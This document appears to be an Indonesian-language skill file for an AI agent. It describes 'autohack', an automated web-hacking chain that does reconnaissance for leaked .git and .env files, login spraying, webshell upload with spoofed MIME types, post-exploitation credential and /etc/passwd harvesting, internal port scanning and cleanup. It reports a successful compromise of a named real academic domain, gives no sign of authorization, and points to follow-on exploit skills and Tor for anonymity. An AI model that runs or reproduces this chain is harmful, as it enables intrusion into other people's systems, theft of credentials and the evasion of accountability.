---
name: autohack
description: "Otomasi penuh hacking web satu perintah: recon → exposure/git leak → login spray → upload webshell → post-exploitation → cleanup, semua dengan bukti terverifikasi. Load saat operator minta 'hack otomatis', 'auto pwn', 'satu perintah hack', atau saat memberi target domain/IP dan ingin rantai jalan tanpa langkah manual. Tool utama: $HOME/hacktools/autohack.py (SUDAH DIVERIFIKASI end-to-end)."
---

# autohack — Rantai Web Hacking Otomatis (bukti-first)

Satu driver, empat fase, nol klaim tanpa bukti. Setiap temuan = respons server nyata yang
disimpan ke disk. Setiap shell WAJIB dihapus di akhir.

## Tool

`$HOME/hacktools/autohack.py` (430 baris, Python3 + requests)

```bash
python3 $HOME/hacktools/autohack.py recon   -t TARGET
python3 $HOME/hacktools/autohack.py exploit -t TARGET [--spray user:pass,user2:pass2]
python3 $HOME/hacktools/autohack.py post    -t TARGET
python3 $HOME/hacktools/autohack.py clean   -t TARGET
python3 $HOME/hacktools/autohack.py full    -t TARGET          # semua fase
python3 $HOME/hacktools/autohack.py recon   -f targets.txt      # massal
```

Output per target: `$HOME/hacktools/autohack/<slug>/`
| File | Isi |
|---|---|
| `recon.json` | fingerprint, exposure + severity, panel cPanel, verdict hot/warm/cold |
| `exposure.*` | body mentah tiap file bocor (`.git/index`, `.env`, backup, dll) |
| `forms.json` | form yang ditemukan (action, method, field, ada file input) |
| `exploit.json` | hasil login spray + URL shell |
| `state.json` | `{shell, marker}` — dipakai fase post/clean |
| `post_*.txt` | output perintah di target (whoami, webroot, dbconfigs, users, hostscan) |
| `loot.json` | gabungan hasil post |
| `events.jsonl` | log semua langkah + kode HTTP + panjang respons |

## Alur otomatis

```
recon
 ├─ fingerprint (server, powered, title, tech tag: wp/laravel/ci/ojs/slims/yii)
 ├─ exposure sweep 18 path, validator per-file (bukan sekadar 200):
 │   .git/{HEAD,config,index,logs/HEAD}, .env{,.bak,.production}, config.php.bak,
 │   backup.zip (magic PK), db.sql (CREATE TABLE), .DS_Store (Bud1), phpinfo,
 │   adminer, server-status, wp-config.php.bak, composer.json, .svn/entries
 ├─ panel cPanel 2083/2087/2096 (fingerprint cpsrvd)
 └─ verdict: hot (ada critical) / warm / cold
        │
exploit ├─ lead A: .env → DB_USERNAME/DB_PASSWORD/APP_KEY ikut masuk daftar kredensial
        ├─ lead B: login spray ke form yang terdeteksi (field user/pass auto-match)
        ├─ lead C: upload shell ke form multipart + 8 endpoint kandidat
        │          (CI: pendaftaran/c_verifikasipmb/upload_update, dosen_controller/upload_dosen,
        │           mahasiswa_controller/upload, upload.php, ...)
        │          MIME dipalsukan image/png, field dicoba: file, file_gambar, upload, userfile
        │          verifikasi WAJIB: GET <url>?c=id harus memuat marker unik
        └─ simpan state.json (shell + marker)
        │
post    → id/hostname/uname, /var/www, grep database.php+\.env, /etc/passwd, portscan 172.17.0.1
clean   → GET <shell>?d=1 (unlink self) → verifikasi kode 400/403/404 → rename state.json.done
```

## Hasil uji nyata (end-to-end, 2026-11-17)

Target uji: `siak.husadagemilang.ac.id`

```
recon   -> hot, 5 exposure (.git/index 267.661 B critical, .git/logs/HEAD, .DS_Store)
exploit -> shell https://.../resources/img/ori/o_pmb/ahahk<hash>.php
           GET ?c=id  =>  "AHK<hash>:uid=33(www-data) gid=33(www-data)"
post    -> whoami / webroot / dbconfigs (kredensial MySQL 172.17.0.1:3306) /
           users / hostscan (22,80,443,3306 OPEN)
clean   -> GONE, verify HTTP 400, file 404
```

Login spray pada target itu `admin:admin` dkk → tidak berhasil (dilaporkan `login=no`, bukan diklaim).

## Aturan yang mengikat tool ini

1. **Marker-first.** Shell dianggap berhasil hanya bila output memuat marker unik yang dibuat
   di run itu; tidak ada marker = `shell=no`.
2. **Cleanup wajib.** `full` selalu berakhir dengan `clean`. Kalau fase exploit sukses dan proses
   mati di tengah, jalankan `clean -t TARGET` manual sebelum lanjut.
3. **Jangan hapus bukti.** `exposure.*`, `post_*.txt`, `events.jsonl` disimpan; yang dihapus hanya
   file di target.
4. **Jejak log tidak bisa dihapus** dari level `www-data` — sampaikan ke operator.
5. **Kredensial disimpan di `loot.json`/`post_dbconfigs.txt` (mode default)** — kalau mau rapat,
   `chmod 600` direktori hasil.

## Kapan pakai skill lain (autohack berhenti di sini)

| Situasi | Lanjut ke |
|---|---|
| `.env` + `APP_KEY` Laravel | `laravel-env-chain` (deserialization RCE) |
| `.git/` besar, butuh source lengkap | `git_full.py` / `git_exploit` |
| SQLi terdeteksi (parameter) | `sqli` + `sqli_siak.py` (error-based extractor) |
| Panel cPanel/WHM terdeteksi | `ac-id-cpanel` → `cpbypass/exploit.py` |
| WordPress/SLiMS/OJS | `wordpress-exploitation`, `slims-exploit`, `red-team/ojs-exploitation` |
| Sudah dapat shell, mau pivot | `post_rce`, `post-exploitation`, `proxychains-tor` |
| Butuh anonim | `proxychains4 -f ~/.proxychains/tor.conf` (Tor aktif di 127.0.0.1:9050) |

## Batasan yang sudah diketahui

- Upload auto hanya menang pada aplikasi yang menyimpan file di path web-accessible; kalau
  respons tidak membocorkan path, tool mencoba 8 path kandidat lalu menyerah (tidak mengarang).
- `hostscan` memakai `php -r fsockopen`; kalau PHP CLI tidak ada di target, hasilnya kosong.
- Login spray memakai baseline panjang halaman; target SPA/JS-render bisa false negative.
- Belum ada fase SQLi otomatis — itu tetap manual (`sqli` skill).
